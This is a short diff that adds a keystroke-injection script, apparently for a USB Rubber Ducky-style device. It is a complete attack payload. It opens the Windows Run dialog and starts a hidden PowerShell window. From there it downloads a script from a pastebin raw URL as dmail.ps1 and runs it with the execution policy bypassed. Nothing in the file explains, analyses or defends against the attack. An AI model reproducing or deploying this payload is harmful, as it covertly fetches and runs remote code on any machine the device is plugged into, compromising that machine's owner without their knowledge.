@@ -1,0 +1,13 @@
+DELAY 500
+REM GUI d
+REM DELAY 150
+GUI r
+DELAY 150
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 200
+STRING Invoke-WebRequest -OutFile dmail.ps1 -Uri pastebin.com/raw/DZkKE7Ge
+ENTER
+STRING powershell -executionpolicy bypass -File .\dmail.ps1
+ENTER
+CAPSLOCK
